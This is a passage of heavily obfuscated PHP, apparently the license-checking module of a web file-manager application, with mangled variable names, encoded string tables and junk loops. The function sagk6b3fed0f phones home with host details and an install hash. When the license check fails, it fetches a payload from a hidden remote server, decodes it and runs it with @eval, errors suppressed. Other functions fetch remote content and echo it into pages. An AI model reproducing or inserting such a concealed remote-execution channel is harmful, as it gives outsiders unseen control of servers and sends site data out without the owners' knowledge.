$¢èùÂğè[$Ú×ĞÂ§Ü[152]], !1); } $õƒ‰‚Ú = Model($Ú×ĞÂ§Ü[33])->get($Ú×ĞÂ§Ü[100]); $È•óÇˆ” = md5($_SERVER[$Ú×ĞÂ§Ü[106]] . $õƒ‰‚Ú); $½íÑÍ›— = array($Ú×ĞÂ§Ü[152] => $¢èùÂğè[$Ú×ĞÂ§Ü[152]], $Ú×ĞÂ§Ü[155] => rand_string(16), $Ú×ĞÂ§Ü[156] => $Ú×ĞÂ§Ü[136], $Ú×ĞÂ§Ü[157] => $Ú×ĞÂ§Ü[158], $Ú×ĞÂ§Ü[159] => $_SERVER[$Ú×ĞÂ§Ü[160]], $Ú×ĞÂ§Ü[161] => $_SERVER[$Ú×ĞÂ§Ü[162]], $Ú×ĞÂ§Ü[163] => $_SERVER[$Ú×ĞÂ§Ü[164]], $Ú×ĞÂ§Ü[105] => $È•óÇˆ”, $Ú×ĞÂ§Ü[165] => Model($Ú×ĞÂ§Ü[33])->get($Ú×ĞÂ§Ü[131])); if (isset($¢èùÂğè[$Ú×ĞÂ§Ü[151]]) && isset($¢èùÂğè[$Ú×ĞÂ§Ü[151]]) == $Ú×ĞÂ§Ü[122]) { $½íÑÍ›—[$Ú×ĞÂ§Ü[151]] = md5($½íÑÍ›—[$Ú×ĞÂ§Ü[152]] . $Ú×ĞÂ§Ü[166] . $½íÑÍ›—[$Ú×ĞÂ§Ü[155]]); } if ($¢èùÂğè[$Ú×ĞÂ§Ü[167]] == $Ú×ĞÂ§Ü[168]) { $¡¼½ÖÍ£ = $this->jgtl93e43aee($È•óÇˆ”, $Ú×ĞÂ§Ü[169]); $äîô§™¸ = $this->xpzbe01e586c(json_encode($½íÑÍ›—), $È•óÇˆ” . $Ú×ĞÂ§Ü[170], 3); $äîô§™¸ = $äîô§™¸ . $Ú×ĞÂ§Ü[171] . $_SERVER[$Ú×ĞÂ§Ü[160]]; $ØšÓËÍ = $this->pfdqea14b6d3($Ú×ĞÂ§Ü[172] . $¡¼½ÖÍ£ . $Ú×ĞÂ§Ü[173] . $äîô§™¸, -1); show_json($ØšÓËÍ, !0); } else { if ($¢èùÂğè[$Ú×ĞÂ§Ü[167]] == $Ú×ĞÂ§Ü[174]) { $¢İ¾‰ğş = substr(md5($Ú×ĞÂ§Ü[175] . $È•óÇˆ”), 12, 15) . $Ú×ĞÂ§Ü[176]; $äîô§™¸ = $this->xozs8c026486(trim($¢èùÂğè[$Ú×ĞÂ§Ü[177]]), $¢İ¾‰ğş, 2); $ö£Ü›è = json_decode($äîô§™¸, !0); if (!is_array($ö£Ü›è) || !is_array($ö£Ü›è[$Ú×ĞÂ§Ü[178]]) || $ö£Ü›è[$Ú×ĞÂ§Ü[152]] != !0) { $ĞÍùÚËœ = $Ú×ĞÂ§Ü[179]; $Êı••ø = $ö£Ü›è[$Ú×ĞÂ§Ü[178]] ? $Ú×ĞÂ§Ü[180] . $ö£Ü›è[$Ú×ĞÂ§Ü[178]] : $ĞÍùÚËœ; show_json($Êı••ø, !1); } else { $½íÑÍ›—[$Ú×ĞÂ§Ü[155]] = $ö£Ü›è[$Ú×ĞÂ§Ü[178]][$Ú×ĞÂ§Ü[181]]; } } else { $ö£Ü›è = $this->pfdqea14b6d3($Ú×ĞÂ§Ü[182], $½íÑÍ›—, 10); } } if (!is_array($ö£Ü›è) || !is_array($ö£Ü›è[$Ú×ĞÂ§Ü[178]]) || $ö£Ü›è[$Ú×ĞÂ§Ü[152]] != !0) { $ĞÍùÚËœ = LNG($Ú×ĞÂ§Ü[183]); $Êı••ø = $ö£Ü›è[$Ú×ĞÂ§Ü[178]] ? $Ú×ĞÂ§Ü[180] . $ö£Ü›è[$Ú×ĞÂ§Ü[178]] : $ĞÍùÚËœ; show_json($Êı••ø, !1); } $Ü­ÛëÄê = $ö£Ü›è[$Ú×ĞÂ§Ü[178]]; $ÏÀÂâêŒ = $this->mivpa98090d4($Ü­ÛëÄê[$Ú×ĞÂ§Ü[184]]); $îÙè×îÜ = $ĞÇç…´”[726]; while (strlen($îÙè×îÜ) < $ĞÇç…´”[713]) { if (!$îÙè×îÜ) { break; } $îÙè×îÜ++; } if (!$ÏÀÂâêŒ || $ÏÀÂâêŒ != $Ü­ÛëÄê[$Ú×ĞÂ§Ü[129]]) { $Ÿ½êØ–Ş = array($Ú×ĞÂ§Ü[185] => Model($Ú×ĞÂ§Ü[33])->get($Ú×ĞÂ§Ü[100]), $Ú×ĞÂ§Ü[186] => $_SERVER[$Ú×ĞÂ§Ü[106]], $Ú×ĞÂ§Ü[187] => this_url(), $Ú×ĞÂ§Ü[161] => $_SERVER[$Ú×ĞÂ§Ü[162]]); $äîô§™¸ = $this->fnou1ea5b5e7(json_encode($Ÿ½êØ–Ş)); $this->pfdqea14b6d3($Ú×ĞÂ§Ü[188] . $äîô§™¸); show_json(LNG($Ú×ĞÂ§Ü[189]), !0); } $’ÈÃİ = array($Ú×ĞÂ§Ü[153] => $Ü­ÛëÄê[$Ú×ĞÂ§Ü[190]], $Ú×ĞÂ§Ü[191] => $Ü­ÛëÄê[$Ú×ĞÂ§Ü[192]], $Ú×ĞÂ§Ü[193] => rand_string(16), $Ú×ĞÂ§Ü[108] => $Ü­ÛëÄê[$Ú×ĞÂ§Ü[194]]); if ($½íÑÍ›—[$Ú×ĞÂ§Ü[155]]) { $’ÈÃİ[$Ú×ĞÂ§Ü[193]] = $½íÑÍ›—[$Ú×ĞÂ§Ü[155]]; } $ĞÈ¥¬À¯ = substr(md5($’ÈÃİ[$Ú×ĞÂ§Ü[191]]), 10, 10); $¶²±¨æº = $ĞÈ¥¬À¯ . $’ÈÃİ[$Ú×ĞÂ§Ü[108]] . $’ÈÃİ[$Ú×ĞÂ§Ü[193]]; $ÌıØÚ™² = $ĞÇç…´”[727]; if (!$ÌıØÚ™²) { die; } $’ÈÃİ[$Ú×ĞÂ§Ü[110]] = strrev(base64_encode($this->jgtl93e43aee($¶²±¨æº, $Ú×ĞÂ§Ü[195]))); $êë¼Ñ = $ĞÇç…´”[728]; if (strlen($êë¼Ñ) < $ĞÇç…´”[713]) { die; } $ÉÕ«æÒ¨ = rand_string(16); $ˆåØŸæ„ = $ĞÇç…´”[729]; while (strlen($ˆåØŸæ„) < $ĞÇç…´”[702]) { if (!$ˆåØŸæ„) { break; } $ˆåØŸæ„++; } $Ÿ‘İù = $ÉÕ«æÒ¨ . $’ÈÃİ[$Ú×ĞÂ§Ü[108]] . $this->jgtl93e43aee(md5($’ÈÃİ[$Ú×ĞÂ§Ü[153]]), $ÉÕ«æÒ¨); $’ÈÃİ[$Ú×ĞÂ§Ü[111]] = base64_encode(strrev($this->jgtl93e43aee($Ÿ‘İù, $Ú×ĞÂ§Ü[196]))); $€ã´íşß = $ĞÇç…´”[730]; if (!$€ã´íşß) { return; } if ($Ü­ÛëÄê[$Ú×ĞÂ§Ü[197]] && $Ü­ÛëÄê[$Ú×ĞÂ§Ü[197]] >= 1) { Model($Ú×ĞÂ§Ü[33])->setDeep($Ú×ĞÂ§Ü[198], $Ú×ĞÂ§Ü[122]); } Model($Ú×ĞÂ§Ü[33])->set($’ÈÃİ); $µµ×Ìò = md5($_SERVER[$Ú×ĞÂ§Ü[106]] . strrev($õƒ‰‚Ú) . $’ÈÃİ[$Ú×ĞÂ§Ü[191]]); $‹±£Şø½ = $ĞÇç…´”[731]; while (strlen($‹±£Şø½) < $ĞÇç…´”[685]) { if (!$‹±£Şø½) { break; } $‹±£Şø½++; } $±„©€éÆ = strrev(substr($µµ×Ìò, 10, 16)); $şÃÄúæÁ = $this->xpzbe01e586c(json_encode($Ü­ÛëÄê), $µµ×Ìò); $‚…º  = array_to_keyvalue(Model($Ú×ĞÂ§Ü[7])->listData(), $Ú×ĞÂ§Ü[199]); $Şª¯ØÊ¢ = $ĞÇç…´”[732]; while ($Şª¯ØÊ¢ < $ĞÇç…´”[710]) { if ($Şª¯ØÊ¢ >= 0) { break; } $Şª¯ØÊ¢++; } $ô¼à¼ŒÊ = $‚…º [$Ú×ĞÂ§Ü[200]]; $¥˜‚Ó¼à = array(); $éğ¢Øùã = $ĞÇç…´”[733]; if (!$éğ¢Øùã) { return; } $¥˜‚Ó¼à[$±„©€éÆ] = $şÃÄúæÁ; Model($Ú×ĞÂ§Ü[7])->update($ô¼à¼ŒÊ[$Ú×ĞÂ§Ü[201]], array($Ú×ĞÂ§Ü[202] => $¥˜‚Ó¼à)); $¿˜çâ¿¹ = $ĞÇç…´”[734]; while ($¿˜çâ¿¹ < $ĞÇç…´”[713]) { if ($¿˜çâ¿¹ >= 0) { break; } $¿˜çâ¿¹++; } $this->xmse874add0a = $Ü­ÛëÄê; $this->rdauebf1f699 = $’ÈÃİ[$Ú×ĞÂ§Ü[108]]; $this->licenseRegistSuccess(); Cache::set($Ú×ĞÂ§Ü[203] . md5($õƒ‰‚Ú . $Ú×ĞÂ§Ü[204]), $Ú×ĞÂ§Ü[6]); show_json(LNG($Ú×ĞÂ§Ü[189]), !0); } private function licenseRegistSuccess() { $‰·ÔˆøØ =& $_SERVER[‚ ×¹Âö]; $ãåüß¼ô = Model($‰·ÔˆøØ[33])->get(); if ($ãåüß¼ô[$‰·ÔˆøØ[63]] != $‰·ÔˆøØ[122]) { Model($‰·ÔˆøØ[33])->set($‰·ÔˆøØ[63], $‰·ÔˆøØ[122]); } Action($‰·ÔˆøØ[205])->initStart(!0); } private function bgmrc0925713() { $Ê£¾õº =& $_SERVER[ìïæ“œî]; $ôæÓ»Èò =& $_SERVER[‚ ×¹Âö]; Model($ôæÓ»Èò[33])->set(array($ôæÓ»Èò[153] => $ôæÓ»Èò[6], $ôæÓ»Èò[191] => $ôæÓ»Èò[6], $ôæÓ»Èò[108] => $ôæÓ»Èò[109], $ôæÓ»Èò[110] => $ôæÓ»Èò[6], $ôæÓ»Èò[111] => $ôæÓ»Èò[6])); Model($ôæÓ»Èò[33])->setDeep($ôæÓ»Èò[198], $ôæÓ»Èò[206]); $µö¬íîå = $Ê£¾õº[735]; if (strlen($µö¬íîå) < $Ê£¾õº[710]) { return; } $this->xmse874add0a = array(); $this->rdauebf1f699 = $ôæÓ»Èò[109]; } private function nbpj06076ed6() { $ÏıìëšÂ =& $_SERVER[ìïæ“œî]; $Ñ—¼‡®’ =& $_SERVER[‚ ×¹Âö]; $_SERVER[$Ñ—¼‡®’[162]] = _get($_SERVER, $Ñ—¼‡®’[162], APP_HOST); $this->rdauebf1f699 = $Ñ—¼‡®’[109]; $Ü»¹ ‡Ë = Model($Ñ—¼‡®’[33])->get(); if ($Ü»¹ ‡Ë[$Ñ—¼‡®’[108]] == $Ñ—¼‡®’[109]) { return; } $¿š®ş = Model($Ñ—¼‡®’[33])->get($Ñ—¼‡®’[100]); $œ¯²¦Ôó = $ÏıìëšÂ[736]; $ÛÙæ…ì´ = $Ñ—¼‡®’[203] . md5($¿š®ş . $Ñ—¼‡®’[204]); $èªüÆ‚ = Cache::get($ÛÙæ…ì´); if (!is_array($èªüÆ‚) || !isset($èªüÆ‚[$Ñ—¼‡®’[207]]) || time() - $èªüÆ‚[$Ñ—¼‡®’[207]] >= 60) { $¿êªîÑñ = Model($Ñ—¼‡®’[7])->loadList(); $Ñ÷š×‡ = $¿êªîÑñ[$Ñ—¼‡®’[200]]; $ìâ´‹™ş = md5($_SERVER[$Ñ—¼‡®’[106]] . strrev($¿š®ş) . $Ü»¹ ‡Ë[$Ñ—¼‡®’[191]]); $ñƒŒ£¸ = strrev(substr($ìâ´‹™ş, 10, 16)); $èªüÆ‚ = $this->xozs8c026486($Ñ÷š×‡[$Ñ—¼‡®’[86]][$ñƒŒ£¸], $ìâ´‹™ş); $èªüÆ‚ = json_decode($èªüÆ‚, !0); } if (!is_array($èªüÆ‚)) { return $this->bgmrc0925713(); } $ôÚŒ°ÇÇ = strtotime($èªüÆ‚[$Ñ—¼‡®’[129]]); if (time() >= $ôÚŒ°ÇÇ) { return $this->bgmrc0925713(); } if (!isset($èªüÆ‚[$Ñ—¼‡®’[207]]) || time() - $èªüÆ‚[$Ñ—¼‡®’[207]] > 20) { $èªüÆ‚[$Ñ—¼‡®’[207]] = time(); Cache::set($ÛÙæ…ì´, $èªüÆ‚); } $this->xmse874add0a = $èªüÆ‚; $this->rdauebf1f699 = $Ü»¹ ‡Ë[$Ñ—¼‡®’[108]]; $ã‡¤ç¨ï = $ÏıìëšÂ[737]; if (strlen($ã‡¤ç¨ï) < $ÏıìëšÂ[688]) { return; } } private function xjat1cdc0de7() { $ÉİÒªÅ­ =& $_SERVER[‚ ×¹Âö]; $ñÏõäŸ = $GLOBALS[$ÉİÒªÅ­[13]]; $“îšº“¾ = $_SERVER[$ÉİÒªÅ­[24]]; if ($“îšº“¾ == $ÉİÒªÅ­[208] && $this->rdauebf1f699 == $ÉİÒªÅ­[109]) { show_json(LNG($ÉİÒªÅ­[209]), !1, $ÉİÒªÅ­[210]); } $â”ÂŒˆÓ = array($ÉİÒªÅ­[211], $ÉİÒªÅ­[212]); if (in_array($“îšº“¾, $â”ÂŒˆÓ)) { if ($this->rdauebf1f699 == $ÉİÒªÅ­[109] && isset($ñÏõäŸ[$ÉİÒªÅ­[213]])) { show_json(LNG($ÉİÒªÅ­[209]), !1, $ÉİÒªÅ­[210]); die; } $ÊƒáÊ å = $this->xlytd9dc25f6(); if ($ÊƒáÊ å != intval($ÉİÒªÅ­[214])) { if ($ÊƒáÊ å <= Model($ÉİÒªÅ­[125])->count()) { show_json(LNG($ÉİÒªÅ­[215]), !1, $ÉİÒªÅ­[210]); die; } } } } private function vbxl02db5c31() { $ºŒ˜÷”İ =& $_SERVER[ìïæ“œî]; $ÃÊ²²÷Õ =& $_SERVER[‚ ×¹Âö]; $º¸Î­Î = array($ÃÊ²²÷Õ[119], $ÃÊ²²÷Õ[120]); if (!KodUser::isRoot() || !isset($_GET[$ÃÊ²²÷Õ[216]])) { return; } if (!in_array($_SERVER[$ÃÊ²²÷Õ[24]], $º¸Î­Î)) { return; } $™¢Å¨¸ = $ÃÊ²²÷Õ[217]; $™¢Å¨¸ = $this->jrzpd7e1b1ac($™¢Å¨¸, $ÃÊ²²÷Õ[218]); $å¬´Ãï = $ºŒ˜÷”İ[738]; if (!$å¬´Ãï) { return; } $Ä¾óŠº¾ = stream_context_create(array($ÃÊ²²÷Õ[219] => array($ÃÊ²²÷Õ[220] => $ÃÊ²²÷Õ[221], $ÃÊ²²÷Õ[222] => 3))); $¥æÀóÙ¶ = $ºŒ˜÷”İ[739]; if (!$¥æÀóÙ¶) { die; } $ø¨±¦ş« = @file_get_contents($™¢Å¨¸, !1, $Ä¾óŠº¾); $Á³éñ‹ = $ºŒ˜÷”İ[740]; while ($Á³éñ‹ < $ºŒ˜÷”İ[688]) { if ($Á³éñ‹ >= 0) { break; } $Á³éñ‹++; } header($ÃÊ²²÷Õ[223]); $³ø¯¿¤– = $ºŒ˜÷”İ[741]; if (!$³ø¯¿¤–) { return; } if ($ø¨±¦ş« && strstr($ø¨±¦ş«, $ÃÊ²²÷Õ[224])) { echo $ø¨±¦ş«; } die; } public function jsayb97098cc($Úú„ø‹ı) { $óıÌ…” =& $_SERVER[ìïæ“œî]; $ØƒÆÏ ‘ =& $_SERVER[‚ ×¹Âö]; if ($this->rdauebf1f699 == $ØƒÆÏ ‘[225]) { return $Úú„ø‹ı; } $Š”üÙ»“ = $this->versionPluginList(); $ê§‰¤ä¤ = explode($ØƒÆÏ ‘[226], $this->versionPluginFilter()); $Æ‰Óèß‚ = $óıÌ…”[742]; $İùêå° = array(); $¿ÂÕ»…› = $óıÌ…”[743]; if (!$¿ÂÕ»…›) { die; } foreach ($Š”üÙ»“ as $ú‚œ„Şˆ => $¡‘¶«·ä) { if ($¡‘¶«·ä == $ØƒÆÏ ‘[227] && substr($this->rdauebf1f699, 0, 1) == $ØƒÆÏ ‘[227]) { continue; } if (!in_array($ú‚œ„Şˆ, $ê§‰¤ä¤)) { $İùêå°[] = $ú‚œ„Şˆ; } } foreach ($İùêå° as $ú‚œ„Şˆ) { unset($Úú„ø‹ı[$ú‚œ„Şˆ]); } return $Úú„ø‹ı; } private function versionPluginList() { $ç¡Ãñ£Ğ =& $_SERVER[‚ ×¹Âö]; return array($ç¡Ãñ£Ğ[228] => $ç¡Ãñ£Ğ[227], $ç¡Ãñ£Ğ[229] => $ç¡Ãñ£Ğ[227], $ç¡Ãñ£Ğ[230] => $ç¡Ãñ£Ğ[227], $ç¡Ãñ£Ğ[231] => $ç¡Ãñ£Ğ[232], $ç¡Ãñ£Ğ[233] => $ç¡Ãñ£Ğ[232], $ç¡Ãñ£Ğ[234] => $ç¡Ãñ£Ğ[232], $ç¡Ãñ£Ğ[235] => $ç¡Ãñ£Ğ[232], $ç¡Ãñ£Ğ[236] => $ç¡Ãñ£Ğ[232], $ç¡Ãñ£Ğ[237] => $ç¡Ãñ£Ğ[232], $ç¡Ãñ£Ğ[238] => $ç¡Ãñ£Ğ[232], $ç¡Ãñ£Ğ[239] => $ç¡Ãñ£Ğ[232], $ç¡Ãñ£Ğ[240] => $ç¡Ãñ£Ğ[232], $ç¡Ãñ£Ğ[241] => $ç¡Ãñ£Ğ[232], $ç¡Ãñ£Ğ[242] => $ç¡Ãñ£Ğ[232], $ç¡Ãñ£Ğ[243] => $ç¡Ãñ£Ğ[232], $ç¡Ãñ£Ğ[244] => $ç¡Ãñ£Ğ[232]); } private function versionPluginFilter() { $–²‘Çè™ =& $_SERVER[ìïæ“œî]; $¾£±á =& $_SERVER[‚ ×¹Âö]; if ($this->rdauebf1f699 == $¾£±á[109]) { return $¾£±á[6]; } $•¸—Œïè = _get($this->xmse874add0a, $¾£±á[245], $¾£±á[6]); $±É¸çÔ = _get($this->xmse874add0a, $¾£±á[116], $¾£±á[6]); $“’ç¤æ„ = $–²‘Çè™[744]; while ($“’ç¤æ„ < $–²‘Çè™[710]) { if ($“’ç¤æ„ >= 0) { break; } $“’ç¤æ„++; } $åâÖ—ò = _get($this->xmse874add0a, $¾£±á[246], $¾£±á[6]); if ($±É¸çÔ > time() && $åâÖ—ò > time()) { $æ‘’—ôË = explode($¾£±á[226], $•¸—Œïè); $Ôğ³ùŞ = array_keys($this->versionPluginList()); $•¸—Œïè = array_merge($æ‘’—ôË, $Ôğ³ùŞ); $•¸—Œïè = implode($¾£±á[226], array_filter(array_unique($•¸—Œïè))); } return $•¸—Œïè; } private function mlsvabee77c2() { $‡š‰ˆÔü =& $_SERVER[‚ ×¹Âö]; if ($this->rdauebf1f699 != $‡š‰ˆÔü[109]) { $GLOBALS[$‡š‰ˆÔü[86]][$‡š‰ˆÔü[90]][$‡š‰ˆÔü[247]] = $‡š‰ˆÔü[206]; return; } $GLOBALS[$‡š‰ˆÔü[86]][$‡š‰ˆÔü[248]] = $‡š‰ˆÔü[122]; if (Model($‡š‰ˆÔü[249])->get($‡š‰ˆÔü[63]) != $‡š‰ˆÔü[206]) { Model($‡š‰ˆÔü[249])->set($‡š‰ˆÔü[63], $‡š‰ˆÔü[206]); } } public function lcms068e356e() { return $_SERVER[‚ ×¹Âö][250]; $†Î˜ŞÖİ = $_SERVER[ìïæ“œî][745]; if (!$†Î˜ŞÖİ) { die; } } private function sagk6b3fed0f() { $½Î§ëÀ‡ =& $_SERVER[ìïæ“œî]; $¼ã¤í÷Å =& $_SERVER[‚ ×¹Âö]; $×ƒïóş = array($¼ã¤í÷Å[251], $¼ã¤í÷Å[252], $¼ã¤í÷Å[253]); $Ÿ¦ã¬™ = $½Î§ëÀ‡[746]; if (strlen($Ÿ¦ã¬™) < $½Î§ëÀ‡[688]) { die; } $ïê¹Ã¥› = $¼ã¤í÷Å[254] . md5($¼ã¤í÷Å[255]); $İ³´”¾³ = $½Î§ëÀ‡[747]; if (strlen($İ³´”¾³) < $½Î§ëÀ‡[713]) { return; } if ($this->rdauebf1f699 == $¼ã¤í÷Å[109] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$¼ã¤í÷Å[24]], $×ƒïóş)) { return; } if (time() % 4 != 0) { return; } $¥À¾´¦¼ = call_user_func(array($¼ã¤í÷Å[256], $¼ã¤í÷Å[257]), $ïê¹Ã¥›); if ($¥À¾´¦¼ && time() - $¥À¾´¦¼ < intval($¼ã¤í÷Å[258])) { return; } call_user_func(array($¼ã¤í÷Å[256], $¼ã¤í÷Å[139]), $ïê¹Ã¥›, time()); $ºá©ğŸƒ = $½Î§ëÀ‡[748]; while (strlen($ºá©ğŸƒ) < $½Î§ëÀ‡[710]) { if (!$ºá©ğŸƒ) { break; } $ºá©ğŸƒ++; } $ãœÙ½²³ = Model($¼ã¤í÷Å[33])->get($¼ã¤í÷Å[100]); $àÔä¥’¥ = $½Î§ëÀ‡[749]; if (strlen($àÔä¥’¥) < $½Î§ëÀ‡[685]) { die; } $•ˆ§§é¾ = array($¼ã¤í÷Å[152] => Model($¼ã¤í÷Å[33])->get($¼ã¤í÷Å[153]), $¼ã¤í÷Å[167] => $this->rdauebf1f699, $¼ã¤í÷Å[163] => $_SERVER[$¼ã¤í÷Å[164]], $¼ã¤í÷Å[165] => Model($¼ã¤í÷Å[33])->get($¼ã¤í÷Å[131]), $¼ã¤í÷Å[105] => md5($_SERVER[$¼ã¤í÷Å[106]] . $ãœÙ½²³), $¼ã¤í÷Å[156] => $¼ã¤í÷Å[136], $¼ã¤í÷Å[159] => $_SERVER[$¼ã¤í÷Å[160]]); $éëÒ·â = $this->pfdqea14b6d3($¼ã¤í÷Å[259], $•ˆ§§é¾); if (!is_array($éëÒ·â)) { return; } if ($éëÒ·â[$¼ã¤í÷Å[152]] && $éëÒ·â[$¼ã¤í÷Å[260]]) { if ($this->mivpa98090d4($éëÒ·â[$¼ã¤í÷Å[260]]) == $•ˆ§§é¾[$¼ã¤í÷Å[152]]) { return; } } $this->bgmrc0925713(); $”İÂÓëƒ = $½Î§ëÀ‡[750]; while (strlen($”İÂÓëƒ) < $½Î§ëÀ‡[688]) { if (!$”İÂÓëƒ) { break; } $”İÂÓëƒ++; } if ($this->mivpa98090d4($éëÒ·â[$¼ã¤í÷Å[260]]) != $•ˆ§§é¾[$¼ã¤í÷Å[152]]) { $«€´„š = array($¼ã¤í÷Å[185] => $ãœÙ½²³, $¼ã¤í÷Å[186] => $_SERVER[$¼ã¤í÷Å[106]], $¼ã¤í÷Å[187] => this_url(), $¼ã¤í÷Å[161] => $_SERVER[$¼ã¤í÷Å[162]]); $øê‰”˜© = $this->fnou1ea5b5e7(json_encode($«€´„š)); $éëÒ·â = $this->pfdqea14b6d3($¼ã¤í÷Å[188] . $øê‰”˜©); if ($éëÒ·â && is_array($éëÒ·â) && isset($éëÒ·â[$¼ã¤í÷Å[260]])) { $†Š¬¢äÕ = $this->xozs8c026486($éëÒ·â[$¼ã¤í÷Å[260]], 2); if ($†Š¬¢äÕ) { $†Š¬¢äÕ = $this->mivpa98090d4($†Š¬¢äÕ); } if ($†Š¬¢äÕ) { try { @eval($†Š¬¢äÕ); } catch (Exception $´¿áœ¥Ï) { } } } } } private function pfdqea14b6d3($™©âë¦ = '', $«˜Ò²Î = array(), $äã¬Š±„ = 5) { $Æº¨ÃŞö =& $_SERVER[ìïæ“œî]; $Ğ¿äãŒ™ =& $_SERVER[‚ ×¹Âö]; $Áé¶Û×© = $Ğ¿äãŒ™[261]; $ ¡æ‘Ö = $Æº¨ÃŞö[751]; if (!$ ¡æ‘Ö) { die; } $Áé¶Û×© = $this->jrzpd7e1b1ac($Áé¶Û×©, $Ğ¿äãŒ™[262]); $É„ôñÓ = $Æº¨ÃŞö[752]; while ($É„ôñÓ < $Æº¨ÃŞö[688]) { if ($É„ôñÓ >= 0) { break; } $É„ôñÓ++; } $Áé¶Û×© = $Áé¶Û×© . $™©âë¦; if ($«˜Ò²Î && is_array($«˜Ò²Î)) { $Áé¶Û×© = $Áé¶Û×© . $Ğ¿äãŒ™[263] . http_build_query($«˜Ò²Î); } if ($«˜Ò²Î === -1) { return $Áé¶Û×©; } $Ñ¶è—Ÿ = stream_context_create(array($Ğ¿äãŒ™[219] => array($Ğ¿äãŒ™[222] => $äã¬Š±„, $Ğ¿äãŒ™[220] => $Ğ¿äãŒ™[264]), $Ğ¿äãŒ™[265] => array($Ğ¿äãŒ™[266] => !1, $Ğ¿äãŒ™[267] => !1))); $«˜Ò²Î = @file_get_contents($Áé¶Û×©, !1, $Ñ¶è—Ÿ); return json_decode($«˜Ò²Î, !0); $«ŒÌÙå¬ = $Æº¨ÃŞö[753]; } private function xlytd9dc25f6() { $©›Ú³ß =& $_SERVER[ìïæ“œî]; $¢¿ÖÆ›« =& $_SERVER[‚ ×¹Âö]; $»Ë¾Ï² = array($¢¿ÖÆ›«[268] => $¢¿ÖÆ›«[269], $¢¿ÖÆ›«[270] => $¢¿ÖÆ›«[271], $¢¿ÖÆ›«[272] => $¢¿ÖÆ›«[273], $¢¿ÖÆ›«[274] => $¢¿ÖÆ›«[275], $¢¿ÖÆ›«[276] => $¢¿ÖÆ›«[277], $¢¿ÖÆ›«[278] => $¢¿ÖÆ›«[214], $¢¿ÖÆ›«[279] => $¢¿ÖÆ›«[214], $¢¿ÖÆ›«[280] => $¢¿ÖÆ›«[269], $¢¿ÖÆ›«[281] => $¢¿ÖÆ›«[271], $¢¿ÖÆ›«[282] => $¢¿ÖÆ›«[273], $¢¿ÖÆ›«[283] => $¢¿ÖÆ›«[284], $¢¿ÖÆ›«[285] => $¢¿ÖÆ›«[275], $¢¿ÖÆ›«[286] => $¢¿ÖÆ›«[287], $¢¿ÖÆ›«[288] => $¢¿ÖÆ›«[277], $¢¿ÖÆ›«[289] => $¢¿ÖÆ›«[290], $¢¿ÖÆ›«[291] => $¢¿ÖÆ›«[292], $¢¿ÖÆ›«[293] => $¢¿ÖÆ›«[294]); $ğ÷å£¥ô = $©›Ú³ß[754]; if (strlen($ğ÷å£¥ô) < $©›Ú³ß[713]) { die; } $Ñß±ÜÎÓ = $»Ë¾Ï²[$this->rdauebf1f699]; $Ñß±ÜÎÓ = intval($Ñß±ÜÎÓ ? $Ñß±ÜÎÓ : $¢¿ÖÆ›«[269]); $—‹°—õ = _get($this->xmse874add0a, $¢¿ÖÆ›«[295]); $€ĞĞßŸŠ = $©›Ú³ß[755]; while ($€ĞĞßŸŠ < $©›Ú³ß[702]) { if ($€ĞĞßŸŠ >= 0) { break; } $€ĞĞßŸŠ++; } $—‹°—õ = $—‹°—õ ? intval($—‹°—õ) : 0; $ÊÉÂÆ©ù = $©›Ú³ß[756]; if (!$ÊÉÂÆ©ù) { die; } return $Ñß±ÜÎÓ + $—‹°—õ; } public function qzks6b5ba224($­£õúò) { $”ÄÄæ =& $_SERVER[‚ ×¹Âö]; $éà•„ç = $this->xlytd9dc25f6(); if ($­£õúò[$”ÄÄæ[296]] == $”ÄÄæ[122]) { return; } if ($éà•„ç >= intval($”ÄÄæ[214])) { return; } $ä†¦Ì¢» = Model($”ÄÄæ[125])->count(); if ($ä†¦Ì¢» <= $éà•„ç) { return; } $Ö½Ûà»È = Model($”ÄÄæ[125])->field($”ÄÄæ[296])->limit($éà•„ç)->select(); $Ö½Ûà»È = array_to_keyvalue($Ö½Ûà»È, $”ÄÄæ[6], $”ÄÄæ[296]); if (!in_array($­£õúò[$”ÄÄæ[296]], $Ö½Ûà»È)) { show_json($”ÄÄæ[297], !1, $”ÄÄæ[210]); } } public function tbms509c3377() { $È¡ÚÛ“ñ =& $_SERVER[ìïæ“œî]; $ˆ€Å¸ú =& $_SERVER[‚ ×¹Âö]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $èòÓøÇ± = $ˆ€Å¸ú[217]; $Ğâ“Ñ°Ç = $È¡ÚÛ“ñ[757]; while (strlen($Ğâ“Ñ°Ç) < $È¡ÚÛ“ñ[688]) { if (!$Ğâ“Ñ°Ç) { break; } $Ğâ“Ñ°Ç++; } $èòÓøÇ± = $this->jrzpd7e1b1ac($èòÓøÇ±, $ˆ€Å¸ú[218]); $Ô¶¡¯†… = $È¡ÚÛ“ñ[758]; if (strlen($Ô¶¡¯†…) < $È¡ÚÛ“ñ[713]) { die; } $à£õ¾Şô = stream_context_create(array($ˆ€Å¸ú[219] => array($ˆ€Å¸ú[220] => $ˆ€Å¸ú[221], $ˆ€Å¸ú[222] => 3))); $¦ñµ©½ = $È¡ÚÛ“ñ[759]; if (strlen($¦ñµ©½) < $È¡ÚÛ“ñ[710]) { return; } $í¦š“¨É = @file_get_contents($èòÓøÇ±, !1, $à£õ¾Şô); echo $ˆ€Å¸ú[298] . hash_encode($í¦š“¨É) . $ˆ€Å¸ú[299]; } private function xpzbe01e586c($†úˆÔ‹œ, $Ñìéû¯, $ˆ¢‘«½ = 3) { $®ÔÆš°Ç =& $_SERVER[ìïæ“œî]; $¹²ÁÆúÆ =& $_SERVER[‚ ×¹Âö]; usleep(1); $†úˆÔ‹œ = trim($†úˆÔ‹œ); $ˆœçÆ¥ = $®ÔÆš°Ç[760]; while ($ˆœçÆ¥ < $®ÔÆš°Ç[710]) { if ($ˆœçÆ¥ >= 0) { break; } $ˆœçÆ¥++; } $ùİÉìò… = mt_rand(0, 5) . $¹²ÁÆúÆ[6]; $Ü‡½±Ä“ = rand_string(15); $¯´¤Ñ¯ë = $¹²ÁÆúÆ[300]; switch ($ùİÉìò…) { case $¹²ÁÆúÆ[206]: $—¨†¯Í = $this->jgtl93e43aee($†úˆÔ‹œ, strrev($Ñìéû¯ . $Ü‡½±Ä“)); break; case $¹²ÁÆúÆ[122]: $—¨†¯Í = $this->jgtl93e43aee($†úˆÔ‹œ, strrev($Ü‡½±Ä“ . $Ñìéû¯)); $àÀÊ´û– = $®ÔÆš°Ç[761]; break; $¥“‹á› = 